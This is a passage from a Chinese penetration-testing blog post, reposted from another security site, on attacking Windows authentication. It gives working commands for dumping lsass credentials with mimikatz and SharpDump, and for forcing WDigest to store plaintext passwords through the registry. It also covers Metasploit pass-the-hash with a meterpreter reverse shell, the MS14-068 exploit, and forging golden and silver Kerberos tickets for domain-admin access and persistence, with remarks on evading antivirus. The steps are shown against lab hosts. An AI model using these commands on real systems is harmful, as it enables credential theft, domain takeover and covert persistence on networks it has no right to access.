<p><img src="/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/20191019220048-da7a7f34-f278-1.png" alt="20191019220048-da7a7f34-f278-1"></p>
<p>在另一台xp中就可以成功导出和读取：</p>
<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::minidump lsass.dmp</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></div></figure>

<p><img src="/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/20191019220101-e2685c84-f278-1.png" alt="20191019220101-e2685c84-f278-1"></p>
<p>工具地址：<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="SharpDump">
          <a href="#SharpDump" class="heading-link"><i class="fas fa-link"></i></a>SharpDump</h2>
      <p>一款C#的工具，GitHub上提供了project源码，在VS中以release编译完成即可使用。</p>
<p>测试只有极少的杀软会报毒，但本地测试时win10的defender会报毒，是否免杀视情况而定吧。需要administrator及以上的权限。</p>
<p><img src="/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/20191019220117-ebe60360-f278-1.png" alt="20191019220117-ebe60360-f278-1"></p>
<p>然后将打包的<code>debug824.bin</code>下载到本地，修改扩展名为<code>gz</code>，将解压后得到的文件导入mimikatz</p>
<p>(<strong>注意</strong>：我第一次测试时导入失败了，之后换了最新版本的mimikatz后成功导入)</p>
<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::minidump &lt;要导入的文件名&gt;</span><br><span class="line">sekurlsa::logonPasswords full</span><br></pre></td></tr></table></div></figure>

<p><img src="/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/20191019220136-f6f51610-f278-1.png" alt="20191019220136-f6f51610-f278-1"></p>
<p>但是用户明文密码处是<code>(null)</code>，查了一下发现原来Windows Server 2012 R2以上的系统默认不向内存中保存明文密码了。这个我们可以通过修改注册表来解决（需要权限）：</p>
<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f</span><br></pre></td></tr></table></div></figure>

<p>然后重启win10，用户重新登录再导出一次，然后在mimikatz中导入就可以看到明文的密码：</p>
<p><img src="/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/20191019220158-03f03174-f279-1.png" alt="20191019220158-03f03174-f279-1"></p>
<p><strong>工具地址：</strong><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://github.com/GhostPack/SharpDump">https://github.com/GhostPack/SharpDump</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="Hash传递攻击-Pass-The-Hash">
          <a href="#Hash传递攻击-Pass-The-Hash" class="heading-link"><i class="fas fa-link"></i></a>Hash传递攻击(Pass-The-Hash)</h1>
      <p>在渗透过程中，如果从lsass.exe进程得不到明文密码，并且拿到的用户hash也破解不出结果，我们就可以使用hash传递攻击</p>
<p>从上面写的NTLM认证方式中我们可以了解到在NTLM认证过程中用户的明文密码是不在客户端和服务端之间传输的，认证最主要的凭据就是用户的NTLM Hash。</p>
<p>那么当攻击者拿到用户的NTLM Hash时，攻击者完全可以只利用NTLM Hash与服务端完成身份认证的流程，达到冒充该用户的目的。</p>

        <h2 id="MSF">
          <a href="#MSF" class="heading-link"><i class="fas fa-link"></i></a>MSF</h2>
      <p>使用msf的<code>exploit/windows/smb/psexec</code>模块可以进行hash传递攻击，条件是目标开启445端口，而且没有打KB2871997和KB2928120这两个补丁</p>
<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;psexec</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.206.128</span><br><span class="line">set RHOST 192.168.206.101</span><br><span class="line">set SMBUser administrator</span><br><span class="line">set SMBPass AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0</span><br><span class="line">exploit</span><br></pre></td></tr></table></div></figure>

<p>注意<code>SMBPass</code>参数要写成<code>&lt;LM Hash&gt;:&lt;NTLM Hash&gt;</code>的形式，exploit后可以成功拿到目标计算机的meterpreter会话</p>
<p><img src="/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/20191019220242-1e262c56-f279-1.png" alt="20191019220242-1e262c56-f279-1"></p>

        <h2 id="mimikatz-1">
          <a href="#mimikatz-1" class="heading-link"><i class="fas fa-link"></i></a>mimikatz</h2>
      <p>其实这个是在微软发布了KB2871997补丁之后mimikatz提供的解决办法，也被称为<strong>Over Pass-the-hash</strong></p>

        <h3 id="工作组环境">
          <a href="#工作组环境" class="heading-link"><i class="fas fa-link"></i></a>工作组环境</h3>
      <p>首先我们假设在WIN2003上我们使用wce抓取到了administrator的NTLM Hash</p>
<p><img src="/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/20191019220317-3352fa32-f279-1.png" alt="20191019220317-3352fa32-f279-1"></p>
<p>然后我们到WINXP中使用mimikatz进行hash传递攻击：</p>
<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth &#x2F;user:&lt;用户名&gt; &#x2F;domain:&lt;远程服务器地址&gt; &#x2F;ntlm:&lt;用户的NTLM Hash&gt;</span><br></pre></td></tr></table></div></figure>

<p><img src="/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/20191019220333-3c876908-f279-1.png" alt="20191019220333-3c876908-f279-1"></p>
<p>之后会弹出一个cmd的窗口，我们在这个cmd中可以进行对目标计算机的一些操作，如列出WIN2003的c盘文件：</p>
<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\192.168.206.101\c$</span><br></pre></td></tr></table></div></figure>

<p><img src="/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/20191019220348-45dd1606-f279-1.png" alt="20191019220348-45dd1606-f279-1"></p>

        <h3 id="域环境">
          <a href="#域环境" class="heading-link"><i class="fas fa-link"></i></a>域环境</h3>
      <p>如果我们拿到了域内一台服务器的域用户账号，那么我们可能想域管或者其他域用户会不会使用的是同样的密码呢？</p>
<p>假设我们此时拿到了一个普通域用户的NTLM Hash，而域管理员使用的是同样的密码（测试时我是直接在域控WIN08上抓下来的2333），然后便可以尝试利用改NTLM Hash去访问域控</p>
<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth &#x2F;user:&lt;域管理员名&gt; &#x2F;domain:&lt;所属域名称&gt; &#x2F;ntlm:&lt;域管的NTLM Hash&gt;</span><br></pre></td></tr></table></div></figure>

<p>在弹出的cmd中成功访问到域控的c盘</p>
<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\WIN08\$c</span><br></pre></td></tr></table></div></figure>

<p><img src="/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/20191019220408-51c107fc-f279-1.png" alt="20191019220408-51c107fc-f279-1"></p>

        <h1 id="票据传递攻击-Pass-The-Ticket">
          <a href="#票据传递攻击-Pass-The-Ticket" class="heading-link"><i class="fas fa-link"></i></a>票据传递攻击(Pass-The-Ticket)</h1>
      <p>**票据传递攻击(Pass-The-Ticket)**就是利用伪造的kerberos票据进行身份认证，该过程不需要密码。</p>
<p>域中的票据又分为<strong>黄金票据(Golden Ticket)**和</strong>白银票据(Silver Ticket)**，其中黄金票据可以使攻击者直接提升为域管理权限，而白银票据则可以使攻击者访问特定的服务。</p>

        <h2 id="黄金票据-Golden-Ticket">
          <a href="#黄金票据-Golden-Ticket" class="heading-link"><i class="fas fa-link"></i></a>黄金票据(Golden Ticket)</h2>
      <p>黄金票据的本质就是一张<strong>TGT(Ticket Granting Ticket)**，攻击者使用krbtgt账户的hash伪造黄金票据，进而访问域中包括域控的所有服务器。该攻击过程发生在前面所说的</strong>获取ST<strong>的第</strong>1**步</p>

        <h3 id="MS14-068">
          <a href="#MS14-068" class="heading-link"><i class="fas fa-link"></i></a>MS14-068</h3>
      <p>利用该漏洞可以将域内任何普通用户提升为域管权限，微软发布的补丁为：<code>kb3011780</code>。如果域控没有打上该补丁的话，攻击者就有可能利用该漏洞提升自己的权限</p>
<p>首先我们使用一个普通域用户test登录到WIN7上，并记录该用户的sid：</p>
<p><img src="/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/20191019220425-5ba8e794-f279-1.png" alt="20191019220425-5ba8e794-f279-1"></p>
<p>此时访问域控的C盘根目录是没有权限的：</p>
<p><img src="/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/20191019220444-66d69b16-f279-1.png" alt="20191019220444-66d69b16-f279-1"></p>
<p>我们使用MS-14068.exe，生成票据：</p>
<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MS14-068.exe -u &lt;用户名&gt;@&lt;所属域名称&gt; -s &lt;此用户的sid&gt; -d &lt;域控地址&gt; -p &lt;此用户的密码&gt;</span><br></pre></td></tr></table></div></figure>

<p><img src="/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/20191019220502-71e2c002-f279-1.png" alt="20191019220502-71e2c002-f279-1"></p>
<p>然后再使用mimikatz将票据导入：</p>
<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptc TGT_test@centoso.com.ccache</span><br></pre></td></tr></table></div></figure>

<p><img src="/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/20191019220523-7dfc44c6-f279-1.png" alt="20191019220523-7dfc44c6-f279-1"></p>
<p>导入之后便可以成功访问域控WIN08的C盘根目录（还可以访问该域中的其他服务器）：</p>
<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\WIN08\c$</span><br></pre></td></tr></table></div></figure>

<p><img src="/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/20191019220541-88c14d8e-f279-1.png" alt="20191019220541-88c14d8e-f279-1"></p>
<p>还可以使用微软的SysinternalsSuite工具包中的psexec.exe来获取WIN08的shell：</p>
<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Psexec64.exe \\WIN08 cmd.exe</span><br></pre></td></tr></table></div></figure>

<p><img src="/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/20191019220649-b1901d94-f279-1.png" alt="20191019220649-b1901d94-f279-1"></p>
<p><strong>PS：</strong>WINXP与WIN2003均测试失败，mimikatz无法导入生成的TGT</p>

        <h3 id="mimikatz生成">
          <a href="#mimikatz生成" class="heading-link"><i class="fas fa-link"></i></a>mimikatz生成</h3>
      <p>使用mimikatz生成黄金票据需要以下几点条件：</p>
<ul>
<li>知道krbtgt的NTLM Hash或aes256</li>
<li>知道krbtgt的sid</li>
</ul>
<p>该方法经常会用来做拿下域控后的权限维持，因为krbtgt账户的密码基本不会更改，即使域管的密码被修改krbtgt的密码也不会改变</p>
<p>首先假设我们此时已拿到域控权限，使用mimikatz查看krbtgt用户的信息：</p>
<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">lsadump::dcsync &#x2F;domain:centoso.com &#x2F;user:krbtgt</span><br></pre></td></tr></table></div></figure>

<p><img src="/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/20191019220709-bd41bcec-f279-1.png" alt="20191019220709-bd41bcec-f279-1"></p>
<p>拿到krbtgt的NTLM Hash和sid后，我们就可以在一台普通域服务器上生成黄金票据并导入：</p>
<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden &#x2F;user:&lt;域管&gt; &#x2F;domain:&lt;所属域名称&gt; &#x2F;sid:&lt;krbtgt的sid&gt; &#x2F;krbtgt:&lt;krbtgt的NTLM Hash&gt; &#x2F;ptt</span><br></pre></td></tr></table></div></figure>

<p><img src="/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/20191019220729-c91f6bb8-f279-1.png" alt="20191019220729-c91f6bb8-f279-1"></p>
<p>也可以先将黄金票据生成为ticket.kirbi文件后再导入：</p>
<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden &#x2F;user:&lt;域管&gt; &#x2F;domain:&lt;所属域名称&gt; &#x2F;sid:&lt;krbtgt的sid&gt; &#x2F;krbtgt:&lt;krbtgt的NTLM Hash&gt;</span><br><span class="line">kerberos:ptt ticket.kirbi</span><br></pre></td></tr></table></div></figure>

<p><img src="/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/20191019220755-d90d4f4a-f279-1.png" alt="20191019220755-d90d4f4a-f279-1"></p>
<p>查看本机已有的票据：</p>
<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::list</span><br></pre></td></tr></table></div></figure>

<p><img src="/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/20191019220821-e83d39ee-f279-1.png" alt="20191019220821-e83d39ee-f279-1"></p>
<p>尝试将域控的C盘映射到本地的K盘：</p>
<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use K: \\WIN08\c$</span><br></pre></td></tr></table></div></figure>

<p><img src="/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/20191019220846-f74b0cb8-f279-1.png" alt="20191019220846-f74b0cb8-f279-1"></p>

        <h2 id="白银票据-Silver-Ticket">
          <a href="#白银票据-Silver-Ticket" class="heading-link"><i class="fas fa-link"></i></a>白银票据(Silver Ticket)</h2>
      <p>白银票据的本质是一张ST(Service Ticket)，也就是使用要访问的服务器的hash来伪造白银票据。区别于黄金票据的是白银票据只能访问指定的服务，但白银票据的优点是于目标服务器不经过DC直接交互。</p>
<p>对于白银票据的生成也有以下几点要求：</p>
<ul>
<li>目标服务账户的NTLM Hash</li>
<li>目标服务器账户的sid</li>
</ul>

        <h3 id="mimikatz生成-1">
          <a href="#mimikatz生成-1" class="heading-link"><i class="fas fa-link"></i></a>mimikatz生成</h3>
      <p>假设我们拿到目标服务账户的NTLM Hash和sid</p>
<p>然后使用mimikatz生成一张可以访问WIN2003的白银票据：</p>
<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden &#x2F;domain:&lt;所属域名称&gt; &#x2F;sid:&lt;服务账户sid&gt; &#x2F;target:&lt;目标服务器的FQDN&gt; &#x2F;service:&lt;要访问的服务&gt; &#x2F;rc4:&lt;服务账户NTLM Hash&gt; &#x2F;user:&lt;要伪造的用户&gt; &#x2F;ptt</span><br></pre></td></tr></table></div></figure>

<p>之后就可以访问目标服务器上对应的服务</p>

        <h1 id="参考文章">
          <a href="#参考文章" class="heading-link"><i class="fas fa-link"></i></a>参考文章</h1>
      <ul>
<li><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://github.com/l3m0n/pentest_study">https://github.com/l3m0n/pentest_study</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li>
<li><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/85941222">https://blog.csdn.net/qq_36119192/article/details/85941222</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li>
<li><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://green-m.me/2019/01/24/play-with-kerberos/">https://green-m.me/2019/01/24/play-with-kerberos/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li>
<li><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/175364">https://www.anquanke.com/post/id/175364</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li>
<li><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/112594.html">https://www.freebuf.com/sectool/112594.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li>
<li>[<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://patrilic.top/2019/05/05/Windows%20%E6%8A%93%E5%8F%96Hash/]">https://patrilic.top/2019/05/05/Windows%20%E6%8A%93%E5%8F%96Hash/]</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>(<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://patrilic.top/2019/05/05/Windows">https://patrilic.top/2019/05/05/Windows</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 抓取Hash/)</li>
<li><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://wh0ale.github.io/2018/12/25/2018-12-25-%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B%E7%A5%A8%E6%8D%AE/">https://wh0ale.github.io/2018/12/25/2018-12-25-%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B%E7%A5%A8%E6%8D%AE/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li>
<li>[<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://paper.vulsee.com/Micro8/%E7%AC%AC%E4%B8%80%E7%99%BE%E9%9B%B6%E4%BA%94%E8%AF%BE%EF%BC%9Awindows%20%E5%8D%95%E6%9C%BA%E5%85%8D%E6%9D%80%E6%8A%93%E6%98%8E%E6%96%87%E6%88%96hash%20%5B%E9%80%9A%E8%BF%87dump%20lsass%E8%BF%9B%E7%A8%8B%E6%95%B0%E6%8D%AE%5D.pdf]">http://paper.vulsee.com/Micro8/%E7%AC%AC%E4%B8%80%E7%99%BE%E9%9B%B6%E4%BA%94%E8%AF%BE%EF%BC%9Awindows%20%E5%8D%95%E6%9C%BA%E5%85%8D%E6%9D%80%E6%8A%93%E6%98%8E%E6%96%87%E6%88%96hash%20%5B%E9%80%9A%E8%BF%87dump%20lsass%E8%BF%9B%E7%A8%8B%E6%95%B0%E6%8D%AE%5D.pdf]</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>(<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://paper.vulsee.com/Micro8/%E7%AC%AC%E4%B8%80%E7%99%BE%E9%9B%B6%E4%BA%94%E8%AF%BE%EF%BC%9Awindows">http://paper.vulsee.com/Micro8/第一百零五课：windows</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 单机免杀抓明文或hash [通过dump lsass进程数据].pdf)</li>
</ul>
<p><strong>* 本文转载自先知社区，原文地址：<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6600">https://xz.aliyun.com/t/6600</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>  侵删！*</strong></p>
</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="http://crlf01.github.io">crlf</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="http://crlf01.github.io/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/">http://crlf01.github.io/2021/02/18/Windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://crlf01.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></span></div><nav class="post-paginator paginator"><div class="paginator-next"><a class="paginator-next__link" href="/2021/01/15/%E6%95%B0%E6%8D%AE%E5%8C%85%E7%9A%84%E6%8D%95%E8%8E%B7/"><span class="paginator-prev__text">数据包的捕获.md</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">
          一、前言</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WCE"><span class="toc-number"></span> <span class="toc-text">
          WCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#QuarkPwDump"><span class="toc-number"></span> <span class="toc-text">
          QuarkPwDump</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reg%E5%AF%BC%E5%87%BA%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%9C%AC%E5%9C%B0%E5%88%86%E6%9E%90"><span class="toc-number"></span> <span class="toc-text">
          Reg导出注册表本地分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mimikatz"><span class="toc-number"></span> <span class="toc-text">
          mimikatz</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ProcDump%E5%AF%BC%E5%87%BA%E6%95%B0%E6%8D%AE%E6%9C%AC%E5%9C%B0%E5%88%86%E6%9E%90"><span class="toc-number"></span> <span class="toc-text">
          ProcDump导出数据本地分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SharpDump"><span class="toc-number"></span> <span class="toc-text">
          SharpDump</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSF"><span class="toc-number"></span> <span class="toc-text">
          MSF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mimikatz-1"><span class="toc-number"></span> <span class="toc-text">
          mimikatz</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E4%BD%9C%E7%BB%84%E7%8E%AF%E5%A2%83"><span class="toc-number"></span> <span class="toc-text">
          工作组环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E7%8E%AF%E5%A2%83"><span class="toc-number"></span> <span class="toc-text">
          域环境</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-Golden-Ticket"><span class="toc-number"></span> <span class="toc-text">
          黄金票据(Golden Ticket)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MS14-068"><span class="toc-number"></span> <span class="toc-text">
          MS14-068</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mimikatz%E7%94%9F%E6%88%90"><span class="toc-number"></span> <span class="toc-text">
          mimikatz生成</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE-Silver-Ticket"><span class="toc-number"></span> <span class="toc-text">
          白银票据(Silver Ticket)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#mimikatz%E7%94%9F%E6%88%90-1"><span class="toc-number"></span> <span class="toc-text">
          mimikatz生成</span></a></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/stun-logo.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">人间值得 未来可期</p></div><div class="sidebar-ov-social"><a class="sidebar-ov-social-item" href="https://github.com/crlf01/" target="_blank" rel="noopener" data-popover="Github" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-github"></i></span></a><a class="sidebar-ov-social-item" href="https://weibo.com/" target="_blank" rel="noopener" data-popover="微博" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-weibo"></i></span></a><a class="sidebar-ov-social-item" href="https://www.zhihu.com/" target="_blank" rel="noopener" data-popover="知乎" data-popover-pos="up"><span class="sidebar-ov-social-item__icon">知</span></a></div><div class="sidebar-ov-feed"></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">11</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">5</div><div class="sidebar-ov-state-item__name">分类</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">5</div><div class="sidebar-ov-state-item__name">标签</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2020~2021</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span><a href="https://github.com/crlf01" rel="noopener" target="_blank">crlf</a></span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v5.2.0</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.1.1</span></div><div class="busuanzi"><span class="busuanzi-siteuv"><span class="busuanzi-siteuv__icon"><i class="fas fa-user"></i></span><span class="busuanzi-siteuv__info">访问人数</span><span class="busuanzi-siteuv__value" 